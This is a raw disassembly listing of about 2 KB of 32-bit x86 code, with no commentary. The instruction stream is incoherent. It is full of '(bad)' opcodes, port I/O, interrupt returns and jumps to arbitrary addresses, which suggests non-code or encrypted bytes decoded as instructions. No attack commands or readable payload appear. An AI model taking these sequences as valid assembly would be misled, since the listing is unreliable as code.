  407129:	scas   eax,DWORD PTR es:[edi]
  40712a:	push   0x404a8d5
  40712f:	and    ecx,eax
  407131:	adc    DWORD PTR [edi-0x53e4bee6],ebp
  407137:	sbb    ebx,ebp
  407139:	sub    ch,cl
  40713b:	mov    dl,0x8e
  40713e:	lods   al,BYTE PTR ds:[esi]
  40713f:	cdq    
  407140:	jl     0x4070ff
  407142:	cmp    BYTE PTR [esi-0x59],bl
  407145:	test   eax,0x4b46f3d5
  40714a:	iret   
  40714b:	add    DWORD PTR [edx-0x7d14398b],edx
  407151:	inc    ebp
  407152:	pop    ebp
  407153:	data16 sahf 
  407155:	int3   
  407156:	or     cl,cl
  407158:	out    0xd0,al
  40715a:	inc    ebx
  40715b:	daa    
  40715c:	fwait
  40715d:	int    0x2f
  40715f:	shl    al,1
  407161:	imul   ebp,DWORD PTR ds:0x97325afa,0x5d
  407168:	mov    edi,edx
  40716a:	in     eax,0x88
  40716c:	pushf  
  40716d:	mul    DWORD PTR [ecx+0x449c1cb5]
  407173:	mov    ss,edx
  407175:	arpl   bp,dx
  407177:	mov    cl,ah
  407179:	jne    0x407193
  40717b:	lods   eax,DWORD PTR ds:[esi]
  40717c:	dec    esi
  40717d:	fidiv  DWORD PTR [ebp+0x34]
  407180:	mov    esi,ebx
  407182:	lods   eax,DWORD PTR ds:[esi]
  407183:	out    0x66,eax
  407185:	out    0x6a,eax
  407187:	or     eax,0xc819bc04
  40718c:	or     al,0x30
  40718e:	addr16 xchg ah,ah
  407191:	inc    eax
  407192:	pop    esi
  407193:	sahf   
  407194:	lock add eax,0xd5adf7c9
  40719a:	cmp    al,0x8
  40719c:	les    eax,FWORD PTR [ecx-0x4d074d5b]
  4071a2:	jp     0x4071ad
  4071a4:	les    edi,FWORD PTR [esi]
  4071a6:	les    esp,FWORD PTR ds:0xefe92533
  4071ac:	cli    
  4071ad:	mov    ah,0x25
  4071af:	lods   eax,DWORD PTR ds:[esi]
  4071b0:	in     al,0xcc
  4071b2:	aad    0x84
  4071b4:	fistp  QWORD PTR ss:[eax+esi*2+0x8]
  4071b9:	and    BYTE PTR [ecx+0xb],bh
  4071bc:	(bad)  
  4071bd:	mov    ss,esi
  4071bf:	fadd   DWORD PTR [esi+eiz*8+0x9e04470]
  4071c6:	pop    esp
  4071c7:	mov    eax,ds:0x5ef1f5db
  4071cc:	data16 loope 0x407237
  4071cf:	sub    esi,DWORD PTR [ecx]
  4071d1:	fstp   QWORD PTR [ecx-0x53a6da9]
  4071d8:	jnp    0x407257
  4071da:	js     0x4071c0
  4071dc:	mov    esp,0x5b6206e8
  4071e1:	fsub   DWORD PTR [ecx]
  4071e3:	scas   al,BYTE PTR es:[edi]
  4071e4:	pop    es
  4071e5:	cmp    BYTE PTR [eax],ch
  4071e7:	stos   BYTE PTR es:[edi],al
  4071e8:	pop    ecx
  4071e9:	cli    
  4071ea:	or     BYTE PTR [ebp+ecx*1+0x4b7827da],bl
  4071f1:	adc    BYTE PTR [esi],ah
  4071f3:	and    bh,BYTE PTR [edi]
  4071f5:	push   0xffffffac
  4071f7:	inc    esp
  4071f8:	add    eax,DWORD PTR [ebx]
  4071fa:	les    ebp,FWORD PTR [edx-0xa]
  4071fd:	ret    0x4fd1
  407200:	mov    WORD PTR [edi-0x57],ss
  407203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407204:	mov    BYTE PTR [eax+0x6a],cl
  407207:	data16 ficom DWORD PTR [esi]
  40720a:	ror    BYTE PTR ds:[ecx+eiz*4-0x2b6361f],cl
  407212:	les    edi,FWORD PTR [ebx-0x42d09071]
  407218:	lock inc ebx
  40721a:	mov    edi,0x1e493d58
  40721f:	jp     0x40729a
  407221:	test   edx,0xda000304
  407227:	dec    edi
  407228:	jmp    0x4072a5
  40722a:	and    eax,0x405da7f5
  40722f:	scas   al,BYTE PTR es:[di]
  407231:	into   
  407232:	aas    
  407233:	(bad)  
  407234:	xchg   ebp,eax
  407235:	shr    DWORD PTR [ebp-0x2],cl
  407238:	xchg   esi,eax
  407239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40723a:	adc    eax,edx
  40723c:	push   esp
  40723d:	mov    eax,ds:0xbf1fe8fd
  407242:	mov    bh,0x1c
  407244:	or     esp,edx
  407246:	mov    al,BYTE PTR [ebx-0x8c0e73f]
  40724c:	adc    al,0xe3
  40724e:	jne    0x4072b7
  407250:	add    DWORD PTR [esi+0x65288be5],edx
  407256:	inc    ebx
  407257:	pop    ds
  407258:	lahf   
  407259:	xchg   edi,eax
  40725a:	jbe    0x4071f5
  40725c:	leave  
  40725d:	adc    al,0x57
  40725f:	cmp    dl,BYTE PTR [edi]
  407261:	outs   dx,BYTE PTR ds:[esi]
  407262:	in     eax,0xe
  407264:	sbb    DWORD PTR [eax+0x42852712],edi
  40726a:	fsub   QWORD PTR [ebx+0x64e8e9d4]
  407270:	add    dl,BYTE PTR [edx+0x6d]
  407273:	test   eax,0x7a2a7f5
  407278:	or     ebp,esp
  40727a:	sbb    al,0xa9
  40727c:	pop    ebx
  40727d:	aam    0x0
  40727f:	mov    edx,0x66872129
  407284:	(bad)  
  407285:	int    0x8b
  407287:	stc    
  407288:	lods   eax,DWORD PTR ds:[esi]
  407289:	and    dh,BYTE PTR [edx+0x4c]
  40728c:	int    0xa3
  40728e:	imul   edx,DWORD PTR [esi+0x634f1014],0x937e77fc
  407298:	inc    esi
  407299:	mov    cs,WORD PTR ds:0xb775671b
  40729f:	mov    dh,0x87
  4072a1:	out    0x8a,eax
  4072a3:	adc    al,0x99
  4072a5:	or     BYTE PTR [ebp+0x5],ch
  4072a8:	repnz pop ss
  4072aa:	ret    0x2573
  4072ad:	and    bl,BYTE PTR [edx]
  4072af:	sbb    ebp,DWORD PTR [esp+esi*4-0x2cc61fec]
  4072b6:	jae    0x407300
  4072b8:	or     eax,DWORD PTR [esi-0x7771c373]
  4072be:	dec    ebx
  4072bf:	int    0x37
  4072c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c2:	mov    bh,0x89
  4072c4:	mov    WORD PTR [eax+eiz*2],fs
  4072c7:	xor    dl,BYTE PTR [ecx+0x50b7a3b7]
  4072cd:	retf   0x1df0
  4072d0:	das    
  4072d1:	cmp    al,BYTE PTR [ebx]
  4072d3:	in     al,dx
  4072d4:	and    edx,DWORD PTR [ebp+0x75]
  4072d7:	jo     0x40729a
  4072d9:	xchg   edi,eax
  4072da:	fidiv  WORD PTR [edi-0x36]
  4072dd:	mov    bl,0x11
  4072df:	repnz iret 
  4072e1:	dec    esi
  4072e2:	icebp  
  4072e3:	mov    esi,0x7fa4618
  4072e8:	push   edi
  4072e9:	sbb    al,0x2e
  4072eb:	sub    BYTE PTR [ecx],al
  4072ed:	lods   eax,DWORD PTR ds:[esi]
  4072ee:	into   
  4072ef:	out    0xad,al
  4072f1:	push   0x57
  4072f3:	push   edi
  4072f4:	fidivr WORD PTR [edi+0x42]
  4072f7:	xor    eax,0x1fc5e548
  4072fc:	enter  0xff89,0xe6
  407300:	push   esi
  407301:	pop    ss
  407302:	jecxz  0x40737a
  407304:	sub    DWORD PTR [ebp+0x6a40e5f0],esi
  40730a:	arpl   WORD PTR [edi+0x321dbecb],ax
  407310:	pusha  
  407311:	cmp    DWORD PTR [ebx],0x7d6c3d7f
  407317:	sbb    DWORD PTR [esi-0x68968fa5],ebp
  40731d:	push   eax
  40731e:	mov    bh,0xcb
  407320:	rcr    ecx,1
  407322:	bound  ebp,QWORD PTR [ecx-0x10]
  407325:	inc    eax
  407326:	mov    ds:0x4d21e6c8,eax
  40732b:	push   ds
  40732c:	jo     0x407349
  40732e:	pop    edi
  40732f:	mov    bl,0x89
  407331:	cmp    ebx,DWORD PTR ds:0x43eac183
  407337:	pop    ss
  407338:	shl    eax,cl
  40733a:	pop    ebp
  40733b:	jb     0x40736d
  40733d:	xor    eax,0xdd346b64
  407342:	push   esi
  407343:	ins    BYTE PTR es:[edi],dx
  407344:	mov    dl,0x14
  407346:	shl    BYTE PTR [edi],1
  407348:	jmp    0x407320
  40734a:	dec    eax
  40734b:	sub    edi,DWORD PTR [ecx-0x401a1f60]
  407351:	pop    ebp
  407352:	cmc    
  407353:	jp     0x4073b5
  407355:	addr16 mov bh,0xf
  407358:	aaa    
  407359:	jbe    0x4073ba
  40735b:	push   ebx
  40735c:	pop    ss
  40735d:	inc    esp
  40735e:	popf   
  40735f:	fild   QWORD PTR [edi+ebp*4]
  407362:	jbe    0x407383
  407364:	stos   BYTE PTR es:[edi],al
  407365:	dec    edx
  407366:	jp     0x4073d4
  407368:	popf   
  407369:	xchg   edi,eax
  40736a:	aad    0xff
  40736c:	aas    
  40736d:	mov    ds:0x2c6ee7fd,al
  407372:	xchg   esp,eax
  407373:	fdivr  DWORD PTR [edi+0x3b465e86]
  407379:	xchg   esp,eax
  40737a:	(bad)
  40737d:	cdq    
  40737e:	and    ch,bh
  407380:	sub    al,0x5d
  407382:	pop    esp
  407383:	and    DWORD PTR ss:[esi+0x1a6ad08a],ebp
  40738a:	dec    esi
  40738b:	and    al,0x6a
  40738d:	dec    esp
  40738e:	(bad)  
  407390:	sub    al,ch
  407392:	cwde   
  407393:	cmp    edx,ebx
  407395:	repz aas 
  407397:	aaa    
  407398:	or     DWORD PTR [edx+0x6f],0x2d600ba8
  40739f:	pop    esp
  4073a0:	iret   
  4073a1:	pushf  
  4073a2:	sub    eax,0xf233fa1c
  4073a7:	aas    
  4073a8:	lea    esp,[edx-0x3]
  4073ab:	push   ebp
  4073ac:	push   ebp
  4073ad:	and    al,al
  4073af:	ret    0xde4f
  4073b2:	(bad)  
  4073b3:	push   ebx
  4073b4:	dec    edi
  4073b5:	adc    al,dl
  4073b7:	or     DWORD PTR [edx+0x57],ebx
  4073ba:	push   edi
  4073bb:	loop   0x4073ba
  4073bd:	push   0x4198b608
  4073c2:	fstp   QWORD PTR [edx-0x58133ba7]
  4073c8:	xchg   esp,eax
  4073c9:	cld    
  4073ca:	into   
  4073cb:	ins    DWORD PTR es:[edi],dx
  4073cc:	arpl   WORD PTR [eax],sp
  4073ce:	or     DWORD PTR [ebx+0x53],0xfffffff1
  4073d2:	gs cdq 
  4073d4:	call   0xa71e3aab
  4073d9:	rcr    DWORD PTR [edx+edi*2],1
  4073dc:	pop    ds
  4073dd:	dec    ebx
  4073de:	repz pop esp
  4073e0:	cwde   
  4073e1:	pop    edx
  4073e2:	dec    ebp
  4073e3:	jbe    0x4073fc
  4073e5:	or     bl,BYTE PTR [edi+ebx*4]
  4073e8:	retf   0xb352
  4073eb:	dec    ecx
  4073ec:	sbb    DWORD PTR ds:0x9468a127,esp
  4073f2:	ins    DWORD PTR es:[edi],dx
  4073f3:	add    eax,0x13d238ad
  4073f8:	or     BYTE PTR [esi],bl
  4073fa:	cdq    
  4073fb:	(bad)  
  4073fd:	inc    edi
  4073fe:	cmp    eax,0xee5f2894
  407403:	test   al,0x5d
  407405:	inc    ebx
  407406:	push   0xffffff9c
  407408:	adc    DWORD PTR [eax],0x4c
  40740b:	test   BYTE PTR [eax-0x60808d90],bl
  407411:	ins    DWORD PTR es:[edi],dx
  407412:	mov    ebx,0x303e1980
  407417:	inc    eax
  407418:	jnp    0x4073e1
  40741a:	test   BYTE PTR [edi+0x77],al
  40741d:	cld    
  40741e:	adc    BYTE PTR [ecx],ah
  407420:	sahf   
  407421:	outs   dx,BYTE PTR ss:[esi]
  407423:	clc    
  407424:	mov    DWORD PTR [eax-0x72cce075],esi
  40742a:	in     eax,dx
  40742b:	lea    esp,[edi+ebp*8-0x7fcabe55]
  407432:	mov    al,0x66
  407434:	cwde   
  407435:	push   esp
  407436:	mov    BYTE PTR [ebp-0x38b0584],ah
  40743c:	fistp  WORD PTR [eax+0x4748fb9a]
  407442:	sahf   
  407443:	test   al,0x3e
  407445:	inc    di
  407447:	js     0x40744c
  407449:	dec    edi
  40744a:	mov    bh,BYTE PTR [eax+0x13]
  40744d:	jle    0x40743f
  40744f:	inc    esi
  407450:	call   0xc609d11
  407455:	sbb    DWORD PTR [esi-0x4c],esp
  407458:	test   BYTE PTR [ecx],dh
  40745a:	jp     0x40748f
  40745c:	sub    ebx,esp
  40745e:	cmp    al,0xf3
  407460:	lods   eax,DWORD PTR cs:[esi]
  407462:	push   ecx
  407463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407464:	cmp    al,0x64
  407466:	sub    al,0xe0
  407468:	add    al,0x7b
  40746a:	pushf  
  40746b:	push   0x332ab6a8
  407470:	xchg   bh,dl
  407472:	shr    BYTE PTR [eax-0x6adc332e],cl
  407478:	in     al,0xa2
  40747a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40747b:	sbb    DWORD PTR [ebp+0x7c297a1],esi
  407481:	push   DWORD PTR [ebx-0x42]
  407484:	xchg   edx,eax
  407485:	sahf   
  407486:	(bad)  
  407487:	add    DWORD PTR [esi+0x3ee36cb6],ebp
  40748d:	push   ebx
  40748e:	xor    bh,ah
  407490:	test   al,0x67
  407492:	gs sbb al,0xe0
  407495:	pop    edx
  407496:	call   0x6b10ebb5
  40749b:	xchg   ebx,eax
  40749c:	push   0x1ce0983b
  4074a1:	jae    0x4074fc
  4074a3:	mov    ebp,0x89b6b8c1
  4074a8:	mov    eax,0x6f07f582
  4074ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ae:	aaa    
  4074af:	mov    ss,eax
  4074b1:	or     ah,BYTE PTR [ecx+0x66]
  4074b4:	(bad)  
  4074b6:	test   BYTE PTR [ecx+0x4f],0x54
  4074ba:	retf   
  4074bb:	leave  
  4074bc:	add    al,BYTE PTR [eax+0x7dc9fbe3]
  4074c2:	es out 0x5,eax
  4074c5:	jp     0x407526
  4074c7:	adc    al,0x4c
  4074c9:	loope  0x407451
  4074cb:	ja     0x40744d
  4074cd:	cmp    cl,dh
  4074cf:	jb     0x407497
  4074d1:	int3   
  4074d2:	push   0x5c36ba72
  4074d7:	fiadd  WORD PTR [ebp+0x32]
  4074da:	add    cl,BYTE PTR [ebx+0x7d]
  4074dd:	sbb    eax,0x6e55844e
  4074e2:	xchg   esi,eax
  4074e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074e4:	xchg   ebx,edi
  4074e6:	int3   
  4074e7:	jmp    0x407514
  4074e9:	packuswb mm1,QWORD PTR [eax]
  4074ec:	lahf   
  4074ed:	pop    ds
  4074ee:	push   0xffffffe1
  4074f0:	add    ch,BYTE PTR [esi+0x3bf8e3c8]
  4074f6:	dec    ebx
  4074f7:	dec    ebx
  4074f8:	mov    ebp,0x82c153d1
  4074fd:	(bad)  
  407500:	or     BYTE PTR [esi-0x7fcb3863],cl
  407506:	stc    
  407507:	lahf   
  407508:	int    0xeb
  40750a:	rol    DWORD PTR [edx+edx*4-0x2956c73],0x5f
  407512:	leave  
  407513:	jb     0x40754f
  407515:	int    0xa6
  407517:	mov    al,0xac
  407519:	adc    al,0x5a
  40751b:	lock and BYTE PTR [esi-0x6ec5cd51],bl
  407522:	cs test esp,0xa1a8aa6f
  407529:	sub    DWORD PTR [ebp+0x6a],0x2d501609
  407530:	add    ebx,DWORD PTR [edx+0x3c]
  407533:	mov    dh,0xcc
  407535:	fcomp  st(6)
  407537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407538:	pop    ds
  407539:	clc    
  40753a:	inc    eax
  40753b:	jmp    0x6c2a:0x91dfe2ee
  407542:	int    0xec
  407544:	fsub   DWORD PTR [ebx+0x71fab526]
  40754a:	jo     0x40756d
  40754c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754d:	fwait
  40754e:	int    0x73
  407550:	or     dh,BYTE PTR [ecx]
  407552:	ds (bad) 
  407555:	push   eax
  407556:	push   ss
  407557:	jg     0x4075a1
  407559:	dec    esi
  40755a:	in     al,0xbc
  40755c:	push   eax
  40755d:	jb     0x40759d
  40755f:	inc    ecx
  407560:	mov    ds:0xc2ecf15b,al
  407565:	in     eax,dx
  407566:	push   ds
  407567:	mov    eax,0x6a9a2629
  40756c:	lods   eax,DWORD PTR ds:[esi]
  40756d:	call   0x5e1d:0xc27da6dd
  407574:	inc    edi
  407575:	jbe    0x4075ee
  407577:	push   ebx
  407578:	push   eax
  407579:	sub    ecx,edi
  40757b:	in     al,0x62
  40757d:	rcr    DWORD PTR [edi+ebp*8-0x4e],cl
  407581:	enter  0xc3d9,0x1b
  407585:	mov    bl,0xd0
  407587:	lea    ebp,[edx-0x58]
  40758a:	fimul  DWORD PTR [edx+esi*1]
  40758d:	call   0x575f:0x687fa25c
  407594:	push   edi
  407595:	(bad)  
  407596:	mov    al,0x0
  407598:	xor    esi,edx
  40759a:	or     BYTE PTR [eax],al
  40759c:	xor    ebp,DWORD PTR [esi-0x50]
  40759f:	icebp  
  4075a0:	or     eax,0xe7ba91d5
  4075a5:	jl     0x4075d3
  4075a7:	in     al,0x7a
  4075a9:	imul   ebp,DWORD PTR [ebx+ebx*2],0x40
  4075ad:	pop    eax
  4075ae:	idiv   BYTE PTR [ebx+0x21]
  4075b1:	dec    ebx
  4075b2:	shl    DWORD PTR [eax-0x49],0x10
  4075b6:	pusha  
  4075b7:	scas   al,BYTE PTR es:[edi]
  4075b8:	cmp    ah,BYTE PTR [eax+0x1b]
  4075bb:	mov    cl,0x6
  4075bd:	jno    0x4075e7
  4075bf:	arpl   WORD PTR [edi-0x3e],dx
  4075c2:	aam    0x4b
  4075c4:	stos   BYTE PTR es:[edi],al
  4075c5:	push   es
  4075c6:	in     al,0xc0
  4075c8:	or     al,0xca
  4075ca:	mov    dh,0x46
  4075cc:	jg     0x4075aa
  4075ce:	ror    esp,0x4c
  4075d1:	cmp    BYTE PTR [esi+0x45453471],cl
  4075d7:	cli    
  4075d8:	or     BYTE PTR [ecx],ch
  4075da:	or     DWORD PTR [eax+ebx*1],0xf2948a84
  4075e1:	jg     0x407656
  4075e3:	int3   
  4075e4:	jmp    0x8341:0x9c107206
  4075eb:	pushf  
  4075ec:	mov    bl,0xed
  4075ee:	shl    DWORD PTR [ecx],1
  4075f0:	call   0xcadc:0xfe5bfeea
  4075f7:	adc    DWORD PTR [edi],esp
  4075f9:	xchg   ecx,eax
  4075fa:	and    eax,0x88bcc1e2
  4075ff:	jg     0x407609
  407601:	in     eax,0xbd
  407603:	pop    ss
  407604:	sbb    BYTE PTR [ebx+0x47829bd3],bl
  40760a:	daa    
  40760b:	arpl   bp,bx
  40760d:	add    bh,BYTE PTR [ebp+0x7dcd7085]
  407613:	movntq QWORD PTR [ebp-0x8],mm6
  407617:	scas   eax,DWORD PTR es:[edi]
  407618:	(bad)  
  407619:	jo     0x407643
  40761b:	inc    esp
  40761c:	mov    esp,0x7429fee0
  407621:	es jmp 0x4075b2
  407624:	dec    edx
  407625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407626:	add    ah,dl
  407628:	mov    edi,0xb655517f
  40762d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40762e:	dec    eax
  40762f:	fild   WORD PTR [ecx-0x19]
  407632:	(bad)  
  407634:	imul   eax,DWORD PTR [esi],0x6b
  407637:	loop   0x40760c
  407639:	lock test eax,0xde4f2be8
  40763f:	inc    edi
  407640:	and    BYTE PTR [edx-0x67],al
  407643:	fmul   DWORD PTR [ecx+0x12]
  407646:	mov    eax,0xc36d39b5
  40764b:	(bad)  
  40764c:	and    al,0x82
  40764e:	enter  0x6789,0xbc
  407652:	lahf   
  407653:	dec    esi
  407654:	dec    ecx
  407655:	add    BYTE PTR [edx-0x66fd539],bl
  40765b:	sahf   
  40765c:	push   0xf5c1aa18
  407661:	fbstp  TBYTE PTR [esi-0x302495dc]
  407667:	xor    bl,bl
  407669:	aam    0x15
  40766b:	pop    ebx
  40766c:	xchg   BYTE PTR [ecx-0x51],ah
  40766f:	or     eax,0x25e0136f
  407674:	mov    eax,0x8a6f473f
  407679:	ds daa 
  40767b:	jl     0x407668
  40767d:	iret   
  40767e:	mov    ch,0x27
  407680:	adc    eax,0xcccca52d
  407685:	call   0x3c69d6d
  40768a:	gs sbb al,0x7f
  40768d:	popf   
  40768e:	sbb    eax,0x7d622414
  407693:	out    0x3d,eax
  407695:	mov    edi,edi
  407697:	rcl    DWORD PTR [edi],cl
  407699:	and    DWORD PTR [ebx+ecx*2-0x37],ebx
  40769d:	jmp    0xa65dab27
  4076a2:	dec    edx
  4076a3:	inc    edx
  4076a4:	rcl    BYTE PTR [eax+0x3c],1
  4076a7:	sbb    bh,bh
  4076a9:	cmp    edx,DWORD PTR [esi]
  4076ab:	lods   al,BYTE PTR ds:[esi]
  4076ac:	push   ss
  4076ad:	test   ebx,eax
  4076af:	jae    0x407645
  4076b1:	mov    ah,0xf1
  4076b3:	hlt    
  4076b4:	inc    edx
  4076b5:	add    eax,0x7818ec1f
  4076ba:	sbb    eax,0x6bf3c31a
  4076bf:	(bad)  
  4076c1:	xor    al,0x6b
  4076c3:	std    
  4076c4:	sbb    al,0x37
  4076c6:	fs aas 
  4076c8:	je     0x407665
  4076ca:	(bad)  
  4076cb:	imul   ecx,DWORD PTR [esi+0x7d],0x3c
  4076cf:	xor    eax,0xbec33460
  4076d4:	xor    eax,0xb1101eb0
  4076d9:	cmc    
  4076da:	scas   eax,DWORD PTR es:[edi]
  4076db:	and    BYTE PTR [ecx+0xf],0x92
  4076df:	ds inc ebp
  4076e1:	add    esp,ebp
  4076e3:	sub    BYTE PTR [edi+0x2e],0xd8
  4076e7:	push   es
  4076e8:	cmc    
  4076e9:	std    
  4076ea:	mov    cl,0x6d
  4076ec:	into   
  4076ed:	push   edi
  4076ee:	sub    edi,ebp
  4076f0:	lods   al,BYTE PTR ds:[esi]
  4076f1:	mov    eax,ds:0x83500419
  4076f6:	mov    bl,al
  4076f8:	jnp    0x4076e8
  4076fa:	daa    
  4076fb:	add    BYTE PTR [ebx+0x59680a23],0xbd
  407702:	push   es
  407703:	enter  0xa457,0xe8
  407707:	xor    bh,dl
  407709:	pop    esp
  40770a:	call   eax
  40770c:	push   ss
  40770d:	xor    eax,0xde45fcdb
  407712:	dec    edx
  407713:	cli    
  407714:	and    eax,0x18798a7f
  407719:	push   edx
  40771a:	pusha  
  40771b:	jns    0x4076a6
  40771d:	add    dl,al
  40771f:	ror    DWORD PTR [esp+ebx*8-0x3dad1bad],0xd2
  407727:	jb     0x407790
  407729:	or     eax,0x833bd23b
  40772e:	push   cs
  40772f:	repnz xchg edi,eax
  407731:	fcmove st,st(4)
  407733:	pop    ebp
  407734:	push   esi
  407735:	sub    BYTE PTR [ebp+0x50],0x9b
  407739:	rcl    DWORD PTR [edx+0x3b50c1ed],cl
  40773f:	retf   0x824b
  407742:	add    eax,0x5f82e556
  407747:	mov    edx,esi
  407749:	dec    ebx
  40774a:	dec    edx
  40774b:	xor    DWORD PTR [edi+0x5],edx
  40774e:	fild   DWORD PTR [eax]
  407750:	jecxz  0x407795
  407752:	cwde   
  407753:	test   eax,0xe87a57a5
  407758:	jmp    0x407702
  40775a:	je     0x40775c
  40775c:	cmp    eax,0x30686788
  407761:	inc    ecx
  407762:	clc    
  407763:	mov    eax,0x42f542d9
  407768:	or     ebx,DWORD PTR [edx]
  40776a:	repz popa 
  40776c:	out    0xf0,eax
  40776e:	fimul  DWORD PTR [ebx+eiz*8]
  407771:	mov    esp,0x7d1bd67
  407776:	sbb    ah,BYTE PTR [ecx-0x343de280]
  40777c:	jo     0x40779b
  40777e:	cdq    
  40777f:	cmp    DWORD PTR [edi+0x3604a10b],0x401536b8
  407789:	xor    ebx,DWORD PTR [ebx+0x32]
  40778c:	add    eax,DWORD PTR [ebp-0x29]
  40778f:	xor    eax,DWORD PTR [edi+0x1b]
  407792:	es out dx,eax
  407794:	inc    ecx
  407795:	sbb    DWORD PTR [ebp+0x2ea60e00],edi
  40779b:	ja     0x407772
  40779d:	jns    0x407767
  40779f:	mov    ebp,DWORD PTR [ebp+0x45]
  4077a2:	mul    DWORD PTR [ecx+0x3e]
  4077a5:	cmp    al,BYTE PTR [edi]
  4077a7:	mov    BYTE PTR [ebp+0x4f],ch
  4077aa:	mov    db2,esi
  4077ad:	out    0xdb,al
  4077af:	sti    
  4077b0:	xor    eax,0xe73807de
  4077b5:	push   DWORD PTR [eax]
  4077b7:	add    ecx,ebp
  4077b9:	inc    ebp
  4077ba:	push   edi
  4077bb:	das    
  4077bc:	bound  esp,QWORD PTR [edi]
  4077be:	cmp    ah,al
  4077c0:	cmp    esp,eax
  4077c2:	sti    
  4077c3:	stc    
  4077c4:	mov    cl,0xee
  4077c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077c7:	fadd   st(7),st
  4077c9:	and    BYTE PTR [edi+0x2ec80dd8],bh
  4077cf:	test   BYTE PTR [edi-0x441f23f1],cl
  4077d5:	mov    ebp,0xbb499ae8
  4077da:	scas   eax,DWORD PTR es:[edi]
  4077db:	add    al,0x13
  4077dd:	jmp    0x872feabe
  4077e2:	mov    ds:0xea1b0bdc,eax
  4077e7:	rcr    BYTE PTR [eax-0x1f],0x24
  4077eb:	(bad)  
  4077ec:	test   al,0xdd
  4077ee:	xor    BYTE PTR [ebx+0x5dcc4b33],dh
  4077f4:	(bad)  
  4077f5:	stc    
  4077f6:	pushf  
  4077f7:	(bad)  
  4077f8:	out    dx,eax
  4077f9:	imul   esp,DWORD PTR [edi],0xffffffa9
  4077fc:	lods   al,BYTE PTR ds:[esi]
  4077fd:	xchg   edx,eax
  4077fe:	dec    esp
  4077ff:	out    0xa2,al
  407801:	mov    esp,0x5a2f1bc
  407806:	push   ss
  407807:	mov    bh,0xed
  407809:	push   0xffffffb8
  40780b:	dec    ecx
  40780c:	popf   
  40780d:	inc    esi
  40780e:	stc    
  40780f:	inc    eax
  407810:	xchg   esi,eax
  407811:	jle    0x407858
  407813:	and    ebp,esi
  407815:	in     eax,0xfa
  407817:	add    ebp,DWORD PTR [ecx]
  407819:	or     eax,0xc0107c10
  40781e:	pusha  
  40781f:	das    
  407820:	and    BYTE PTR [esi],dl
  407822:	mov    WORD PTR [ebx+ecx*1],gs
  407825:	and    bl,BYTE PTR [edi-0x24]
  407828:	xor    al,0x85
  40782a:	inc    eax
  40782b:	scas   al,BYTE PTR es:[edi]
  40782c:	in     al,0x47
  40782e:	mov    bl,0xc8
  407830:	lds    ecx,FWORD PTR [esi+ecx*4+0x2d]
  407834:	xchg   ebp,eax
  407835:	cld    
  407836:	cmp    BYTE PTR ds:0xeef0b7e5,al
  40783c:	sub    bh,bl
  40783e:	iret   
  40783f:	shl    BYTE PTR [edx+0xb7a7aa0],0xa0
  407846:	adc    dl,ch
  407848:	imul   eax,DWORD PTR [eax-0x46],0x24
  40784c:	mov    ds:0x78997df5,eax
  407851:	imul   edx,ebx,0x7704f47d
  407857:	mov    cl,0x7e
  407859:	sub    al,0x99
  40785b:	inc    ebx
  40785c:	ret    0x7479
  40785f:	lea    edx,[ebp+0x2d2a5488]
  407865:	pop    esi
  407866:	or     bh,BYTE PTR [edx+eax*2+0x5a]
  40786a:	sub    bh,al
  40786c:	in     eax,dx
  40786d:	(bad)  
  40786e:	lahf   
  40786f:	or     eax,0x605df811
  407874:	cmp    BYTE PTR [ebp+ecx*8+0x4e],al
  407878:	or     eax,0x26136de6
  40787d:	cdq    
  40787e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40787f:	mov    dl,BYTE PTR [ecx+esi*2-0x41]
  407883:	and    DWORD PTR [edi+eiz*8-0x19287557],eax
  40788a:	aad    0x51
  40788c:	pop    ecx
  40788d:	aas    
  40788e:	adc    DWORD PTR [eax],0x1e5e3508
  407894:	adc    DWORD PTR [eax+0x68],esi
  407897:	paddsw mm7,QWORD PTR [ebp-0x309f2376]
  40789e:	pop    ebx
  40789f:	xchg   ecx,eax
  4078a0:	mov    edx,?
  4078a2:	jb     0x40787b
  4078a4:	adc    al,0xa9
  4078a6:	mov    eax,ds:0x1712a926
  4078ab:	mov    ch,0x32
  4078ad:	cld    
  4078ae:	push   0x53
  4078b0:	add    DWORD PTR [edx-0x54],ebp
  4078b3:	pop    esp
  4078b4:	mov    esi,0x28850e77
  4078b9:	or     eax,0x28ad473b
  4078be:	sahf   
  4078bf:	int3   
  4078c0:	dec    ebp
  4078c1:	mov    dh,0xd
  4078c3:	or     DWORD PTR [ebx+eax*2],0xffffffa5
  4078c7:	jp     0x40784d
  4078c9:	and    eax,0xc6258e8f
  4078ce:	jae    0x40786f
  4078d0:	ror    dh,cl
  4078d2:	into   
  4078d3:	int    0x25
  4078d5:	lock loopne 0x4078f1
  4078d8:	mov    al,ds:0x1dfe6a98
  4078dd:	add    eax,0x1c4eb3e3
  4078e2:	sbb    cl,BYTE PTR [esi-0x5806c6b8]
  4078e8:	arpl   WORD PTR ds:0x56a12728,bp
  4078ee:	int    0x25
  4078f0:	sahf   
  4078f1:	test   al,0xff
  4078f3:	jge    0x407927
  4078f5:	int3   
  4078f6:	dec    ecx
  4078f7:	inc    ecx
  4078f8:	mov    BYTE PTR [esi-0x6c],dl
  4078fb:	inc    edi
  4078fc:	dec    ebp
  4078fd:	jbe    0x40793c
  4078ff:	jle    0x40792b
  407901:	or     DWORD PTR [ebp+ebx*2+0x63],eax
  407905:	or     BYTE PTR [ebp+0x55],al
  407908:	cmp    eax,0x341dc5c0
  40790d:	jb     0x4078bb
  40790f:	repnz and al,0x88
  407912:	xchg   BYTE PTR [edi+edx*8+0x312ac9b9],bl
  407919:	dec    edi
  40791a:	out    dx,eax
  40791b:	xor    ebx,edi
  40791d:	mov    al,0x54
  40791f:	mov    ebx,0xbe3dbdf1
  407924:	add    al,0xba
  407926:	js     0x407963
